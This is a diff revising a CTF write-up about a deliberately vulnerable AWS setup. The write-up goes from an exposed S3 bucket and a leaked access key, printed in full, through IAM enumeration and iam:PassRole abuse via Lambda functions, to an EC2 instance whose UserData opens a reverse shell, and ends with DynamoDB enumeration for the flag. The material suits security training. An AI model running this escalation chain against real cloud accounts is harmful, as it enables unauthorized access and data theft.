@@ -6,7 +6,7 @@
 
 ## Identifying S3 Bucket
 
-https://d20whnyjsgpc34.cloudfront.net
+Firstly, I viewed the source code of the website at https://d20whnyjsgpc34.cloudfront.net, which suggests AWS S3 buckets (since it uses the term S3).
 
 ```html
 <header>
@@ -30,23 +30,13 @@ https://d20whnyjsgpc34.cloudfront.net
 ```
 
 
-Researching on AWS S3 Buckets gives me this
-
-https://atos.net/en/lp/securitydive/poorly-configured-s3-buckets-a-hackers-delight
-Typical Bucket header
-
-https://palindromecloudynekos.s3.amazonaws.com/index.html
+Researching on AWS S3 Buckets gets me to this link, https://atos.net/en/lp/securitydive/poorly-configured-s3-buckets-a-hackers-delight. Following a typical bucket header, I get the link https://palindromecloudynekos.s3.amazonaws.com/index.html
 
 ## Enumerating S3 Bucket
 
-Install AWS CLI
+I installed AWS CLI following [this guide](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html), and configured it using my peronal account. 
 
-https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html
-
-Configure it using your peronal account
-
-Access
-https://n0j.github.io/2017/10/02/aws-s3-ctf.html
+I then accessed the bucket following [this guide](https://n0j.github.io/2017/10/02/aws-s3-ctf.html)
 
 ```bash
 ┌──(kali㉿kali)-[/tmp/flag]
@@ -76,6 +66,8 @@ https://n0j.github.io/2017/10/02/aws-s3-ctf.html
 └─$
 ```
 
+I accessed the file through the initial cloudfront URL. The bucket URL had permissions to prevent `notes.txt` from being accessed directly from there
+
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ curl https://d20whnyjsgpc34.cloudfront.net/api/notes.txt                         
@@ -91,6 +83,8 @@ All EC2 computing instances should be tagged with the key: 'agent' and the value
 └─$ 
 ```
 
+I accessed the endpoint stated in the `notes.txt`, and tested the access key
+
 ```bash
 ┌──(kali㉿kali)-[/tmp/flag]
 └─$ curl https://b40yqpyjb3.execute-api.ap-southeast-1.amazonaws.com/prod/agent                                       
@@ -104,7 +98,7 @@ All EC2 computing instances should be tagged with the key: 'agent' and the value
 └─$ 
 ```
 
-```
+```bash
 ┌──(kali㉿kali)-[/tmp/flag]
 └─$ aws configure                            
 AWS Access Key ID [********************]: AKIAQYDFBGMSUFX5522K
@@ -115,24 +109,13 @@ Default output format [None]:
 └─$
 ```
 
-
-## Cloud Research
-
-execute-api -> Amazon API Gateway
-https://docs.aws.amazon.com/apigateway/latest/developerguide/how-to-call-api.html 
-
-AWS EC2 -> in notes.txt
-- Run instance - Fail
-
-IAM -> Privilege Escalation
-- No Privileges to do so from enumerating
-
-
 # AWS
 
 ## AWS IAM Enum
 
 ### General 
+
+I did some general enumeration first
 ```bash
 ┌──(kali㉿kali)-[/tmp]
 └─$ git clone https://github.com/andresriancho/enumerate-iam.git
@@ -176,10 +159,11 @@ Resolving deltas: 100% (25/25), done.
 2022-09-08 10:29:55,985 - 13773 - [ERROR] Remove globalaccelerator.describe_accelerator_attributes action
 ```
 
-https://aws.amazon.com/premiumsupport/knowledge-center/iam-assume-role-cli/
+I researched on AWS CLI and found some useful resources
+- https://aws.amazon.com/premiumsupport/knowledge-center/iam-assume-role-cli/
+- https://pentestbook.six2dez.com/enumeration/cloud/aws (Especially this)
 
-Researched here
-https://pentestbook.six2dez.com/enumeration/cloud/aws
+
 
 #### STS
 I want to find out the user first
@@ -390,14 +374,15 @@ I tried to find user policy to figure out what I can and cannot do
 └─$
 ```
 
-`arn:aws:iam::051751498533:role/lambda_agent_development_role` as `iam:PassRole`, while
-you can create lambda functions with the name `arn:aws:lambda:ap-southeast-1:051751498533:function:${aws:username}-*`
+You can pass the `arn:aws:iam::051751498533:role/lambda_agent_development_role` role, as it has `iam:PassRole`.
+
+You can also create lambda functions with the name `arn:aws:lambda:ap-southeast-1:051751498533:function:${aws:username}-*`, and then pass the above role to it.
 
 ## AWS Lambda 
 
 ### Function Testing
 
-https://medium.com/@corymaklin/tutorial-amazon-web-services-part-3-lambda-functions-with-aws-cli-ba9f53c5f5ec
+Firstly, I tried running a lambda function with the help of [this guide](https://medium.com/@corymaklin/tutorial-amazon-web-services-part-3-lambda-functions-with-aws-cli-ba9f53c5f5ec)
 
 ```bash
 ┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
@@ -495,79 +480,9 @@ exports.handler = async function(event, context, callback) {
 └─$ 
 ```
 
-### Lambda Python Code Testing
-
-```bash
-┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
-└─$ cat run.sh             
-pip install --target ./package requests
-cd package
-zip -r ../function.zip .
-cd ..
-zip -g function.zip lambda_function.py
-
-┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
-└─$ 
-
-┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
-└─$ cat index.py    
-import requests
-def lambda_handler(event, context):   
-    response = requests.get("https://www.example.com/")
-    print(response.text)
-    return response.text
-
-┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
-└─$ ./run.sh  
-
-...
-
-┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
-└─$ aws lambda create-function --zip-file fileb://function.zip --runtime python3.7 --handler lambda_function.lambda_handler --role arn:aws:iam::051751498533:role/lambda_agent_development_role --function-name user-a5df75ad1753434aa2db7dbe7d361b96-ppp
-{
-    "FunctionName": "user-a5df75ad1753434aa2db7dbe7d361b96-ppp",
-    "FunctionArn": "arn:aws:lambda:ap-southeast-1:051751498533:function:user-a5df75ad1753434aa2db7dbe7d361b96-ppp",
-    "Runtime": "python3.7",
-    "Role": "arn:aws:iam::051751498533:role/lambda_agent_development_role",
-    "Handler": "lambda_function.lambda_handler",
-    "CodeSize": 1044985,
-    "Description": "",
-    "Timeout": 3,
-    "MemorySize": 128,
-    "LastModified": "2022-09-09T09:11:21.568+0000",
-    "CodeSha256": "rrHsbvIX4xmkOxbJk6PHC+j6jBdnH5loEyyrnCYdcPI=",
-    "Version": "$LATEST",
-    "TracingConfig": {
-        "Mode": "PassThrough"
-    },
-    "RevisionId": "300029c8-6dba-4a6d-99ac-9664a7d253aa",
-    "State": "Pending",
-    "StateReason": "The function is being created.",
-    "StateReasonCode": "Creating",
-    "PackageType": "Zip",
-    "Architectures": [
-        "x86_64"
-    ],
-    "EphemeralStorage": {
-        "Size": 512
-    }
-}
-                                                                                                                                                                        
-┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
-└─$ aws lambda invoke --function-name user-a5df75ad1753434aa2db7dbe7d361b96-ppp /tmp/out.txt
-{
-    "StatusCode": 200,
-    "ExecutedVersion": "$LATEST"
-}
-                                                                                                                                                                        
-┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
-└─$ cat /tmp/out.txt 
-"<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <meta http-equiv=\"Content-type\" content=\"text/html; charset=utf-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <style type=\"text/css\">\n    body {\n        background-color: #f0f0f2;\n        margin: 0;\n        padding: 0;\n        font-family: -apple-system, system-ui, BlinkMacSystemFont, \"Segoe UI\", \"Open Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif;\n        \n    }\n    div {\n        width: 600px;\n        margin: 5em auto;\n        padding: 2em;\n        background-color: #fdfdff;\n        border-radius: 0.5em;\n        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);\n    }\n    a:link, a:visited {\n        color: #38488f;\n        text-decoration: none;\n    }\n    @media (max-width: 700px) {\n        div {\n            margin: 0 auto;\n            width: auto;\n        }\n    }\n    </style>    \n</head>\n\n<body>\n<div>\n    <h1>Example Domain</h1>\n    <p>This domain is for use in illustrative examples in documents. You may use this\n    domain in literature without prior coordination or asking for permission.</p>\n    <p><a href=\"https://www.iana.org/domains/example\">More information...</a></p>\n</div>\n</body>\n</html>\n"                                                                                                                                                                        
-┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
-└─$ 
-```
-
 ### Lambda Role Policy
+
+I tried enumerating more on what this lambda role could do to see how could I further privesc from the lambda function. It turns out that there are EC2 privileges here
 
 ```bash
 ┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS/lambda]
@@ -578,7 +493,7 @@ def lambda_handler(event, context):
             "PolicyName": "iam_policy_for_lambda_agent_development_role",
             "PolicyArn": "arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role"
         }
-    ]
+    ]y
 }
                                                                                                                                                                         
 ┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS/lambda]
@@ -656,9 +571,9 @@ An error occurred (AccessDeniedException) when calling the Invoke operation: Use
 
 ### Lambda Privesc, view other Lambda
 
-https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/lambda_privesc/README.md
+I tried viewing the other lambda function first, since it's a privilege with the lambda_agent role. I referred to [here](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/lambda_privesc/README.md) to help with the code.
 
-lambda_function.py
+`lambda_function.py`
 
 ```python
 # https://www.learnaws.org/2020/12/16/aws-ec2-boto3-ultimate-guide/
@@ -682,7 +597,8 @@ def lambda_handler(event, context):
 #role_arn="arn:aws:iam::051751498533:role/ec2_agent_role"
 ```
 
-run.sh
+`run.sh`
+
 ```bash
 LAMBDA_FUNC=user-00e6fd16c555452c900d1b14d6af61c5-ec2test4
 
@@ -702,7 +618,8 @@ cat /tmp/out.txt
 ┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
 └─$ ls
 lambda_function.py  run.sh
-                                                                                            ┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
+
+┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
 └─$ ./run.sh
 ...
 updating: lambda_function.py (deflated 43%)
@@ -808,40 +725,13 @@ def lambda_handler(event, context):
 
 ### Lambda Privesc to EC2 agent role
 
-Find random Amazon Machine Image. Make sure to find one from the specific region
+Find a random Amazon Machine Image. Make sure to find one from the specific region
 
 ![](Pasted%20image%2020220909181736.png)
 
-https://stackoverflow.com/questions/57001004/unable-to-create-an-ec2-instance-using-boto3
 
-lambda_function.py
-```python
-import boto3
 
-REGION_NAME="ap-southeast-1"
-def lambda_handler(event, context):
-    ec2 = boto3.resource('ec2', region_name=REGION_NAME)
-
-    instances = ec2.create_instances(
-       ImageId="ami-0b89f7b3f054b957e", # Found on AWS Portal
-       MinCount=1,
-       MaxCount=1,
-       InstanceType="t2.micro"
-    )
-    return instances["Instances"][0]["InstanceId"]
-```
-
-```bash
-$ ./run.sh
-...
-{"errorMessage": "An error occurred (VPCIdNotSpecified) when calling the RunInstances operation: No default VPC for this user. GroupName is only supported for EC2-Classic and default VPC.", "errorType": "ClientError", "stackTrace": ["  File \"/var/task/lambda_function.py\", line 11, in lambda_handler\n    InstanceType=\"t2.micro\"\n", "  File \"/var/task/boto3/resources/factory.py\", line 520, in do_action\n    response = action(self, *args, **kwargs)\n", "  File \"/var/task/boto3/resources/action.py\", line 83, in __call__\n    response = getattr(parent.meta.client, operation_name)(*args, **params)\n", "  File \"/var/task/botocore/client.py\", line 386, in _api_call\n    return self._make_api_call(operation_name, kwargs)\n", "  File \"/var/task/botocore/client.py\", line 705, in _make_api_call\n    raise error_class(parsed_response, operation_name)\n"]}       
-```
-
-https://www.edureka.co/community/36578/pass-while-creating-the-ec2-instance-aws-using-python-boto3
-
-## Lambda Function
-
-Create a reverse shell to ngrok
+I made a program to launch an EC2 instance, and through the UserData Parameter, create a reverse shell connection to the attacker.
 
 `lambda_function.py`
 
@@ -907,9 +797,13 @@ aws lambda invoke --function-name $LAMBDA_FUNC /tmp/out.txt
 cat /tmp/out.txt
 ```
 
-## UserData Final Exploit
+### Running the exploit
 
 ```bash
+┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
+└─$ ls
+lambda_function.py  run.sh
+
 ┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
 └─$ ./run.sh
 updating: lambda_function.py (deflated 48%)
@@ -962,6 +856,8 @@ bash: no job control in this shell
 ## AWS DynamoDB
 
 ### Role Information
+
+The EC2 agent role is shown to have privileges to access DynamoDB.
 
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -1025,7 +921,9 @@ bash: no job control in this shell
 ```
 
 
-## AWS DynamoDB
+## Viewing Table
+
+I enumerated through DynamoDB to get the flag.
 
 ```bash
 [root@ip-10-0-47-186 /]# aws dynamodb list-tables --region ap-southeast-1
@@ -2068,4 +1966,112 @@ An error occurred (UnauthorizedOperation) when calling the RunInstances operatio
 ```
 
 
-# Flag
+## Cloud Research
+
+execute-api -> Amazon API Gateway
+https://docs.aws.amazon.com/apigateway/latest/developerguide/how-to-call-api.html 
+
+AWS EC2 -> in notes.txt
+- Run instance - Fail
+
+IAM -> Privilege Escalation
+- No Privileges to do so from enumerating
+
+### Lambda Python Code Testing
+
+```bash
+┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
+└─$ cat run.sh             
+pip install --target ./package requests
+cd package
+zip -r ../function.zip .
+cd ..
+zip -g function.zip lambda_function.py
+
+┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
+└─$ 
+
+┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
+└─$ cat index.py    
+import requests
+def lambda_handler(event, context):   
+    response = requests.get("https://www.example.com/")
+    print(response.text)
+    return response.text
+
+┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
+└─$ ./run.sh  
+
+...
+
+┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
+└─$ aws lambda create-function --zip-file fileb://function.zip --runtime python3.7 --handler lambda_function.lambda_handler --role arn:aws:iam::051751498533:role/lambda_agent_development_role --function-name user-a5df75ad1753434aa2db7dbe7d361b96-ppp
+{
+    "FunctionName": "user-a5df75ad1753434aa2db7dbe7d361b96-ppp",
+    "FunctionArn": "arn:aws:lambda:ap-southeast-1:051751498533:function:user-a5df75ad1753434aa2db7dbe7d361b96-ppp",
+    "Runtime": "python3.7",
+    "Role": "arn:aws:iam::051751498533:role/lambda_agent_development_role",
+    "Handler": "lambda_function.lambda_handler",
+    "CodeSize": 1044985,
+    "Description": "",
+    "Timeout": 3,
+    "MemorySize": 128,
+    "LastModified": "2022-09-09T09:11:21.568+0000",
+    "CodeSha256": "rrHsbvIX4xmkOxbJk6PHC+j6jBdnH5loEyyrnCYdcPI=",
+    "Version": "$LATEST",
+    "TracingConfig": {
+        "Mode": "PassThrough"
+    },
+    "RevisionId": "300029c8-6dba-4a6d-99ac-9664a7d253aa",
+    "State": "Pending",
+    "StateReason": "The function is being created.",
+    "StateReasonCode": "Creating",
+    "PackageType": "Zip",
+    "Architectures": [
+        "x86_64"
+    ],
+    "EphemeralStorage": {
+        "Size": 512
+    }
+}
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
+└─$ aws lambda invoke --function-name user-a5df75ad1753434aa2db7dbe7d361b96-ppp /tmp/out.txt
+{
+    "StatusCode": 200,
+    "ExecutedVersion": "$LATEST"
+}
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
+└─$ cat /tmp/out.txt 
+"<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <meta http-equiv=\"Content-type\" content=\"text/html; charset=utf-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <style type=\"text/css\">\n    body {\n        background-color: #f0f0f2;\n        margin: 0;\n        padding: 0;\n        font-family: -apple-system, system-ui, BlinkMacSystemFont, \"Segoe UI\", \"Open Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif;\n        \n    }\n    div {\n        width: 600px;\n        margin: 5em auto;\n        padding: 2em;\n        background-color: #fdfdff;\n        border-radius: 0.5em;\n        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);\n    }\n    a:link, a:visited {\n        color: #38488f;\n        text-decoration: none;\n    }\n    @media (max-width: 700px) {\n        div {\n            margin: 0 auto;\n            width: auto;\n        }\n    }\n    </style>    \n</head>\n\n<body>\n<div>\n    <h1>Example Domain</h1>\n    <p>This domain is for use in illustrative examples in documents. You may use this\n    domain in literature without prior coordination or asking for permission.</p>\n    <p><a href=\"https://www.iana.org/domains/example\">More information...</a></p>\n</div>\n</body>\n</html>\n"                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
+└─$ 
+```
+
+https://stackoverflow.com/questions/57001004/unable-to-create-an-ec2-instance-using-boto3
+
+lambda_function.py
+```python
+import boto3
+
+REGION_NAME="ap-southeast-1"
+def lambda_handler(event, context):
+    ec2 = boto3.resource('ec2', region_name=REGION_NAME)
+
+    instances = ec2.create_instances(
+       ImageId="ami-0b89f7b3f054b957e", # Found on AWS Portal
+       MinCount=1,
+       MaxCount=1,
+       InstanceType="t2.micro"
+    )
+    return instances["Instances"][0]["InstanceId"]
+```
+
+```bash
+$ ./run.sh
+...
+{"errorMessage": "An error occurred (VPCIdNotSpecified) when calling the RunInstances operation: No default VPC for this user. GroupName is only supported for EC2-Classic and default VPC.", "errorType": "ClientError", "stackTrace": ["  File \"/var/task/lambda_function.py\", line 11, in lambda_handler\n    InstanceType=\"t2.micro\"\n", "  File \"/var/task/boto3/resources/factory.py\", line 520, in do_action\n    response = action(self, *args, **kwargs)\n", "  File \"/var/task/boto3/resources/action.py\", line 83, in __call__\n    response = getattr(parent.meta.client, operation_name)(*args, **params)\n", "  File \"/var/task/botocore/client.py\", line 386, in _api_call\n    return self._make_api_call(operation_name, kwargs)\n", "  File \"/var/task/botocore/client.py\", line 705, in _make_api_call\n    raise error_class(parsed_response, operation_name)\n"]}       
+```
+
+https://www.edureka.co/community/36578/pass-while-creating-the-ec2-instance-aws-using-python-boto3
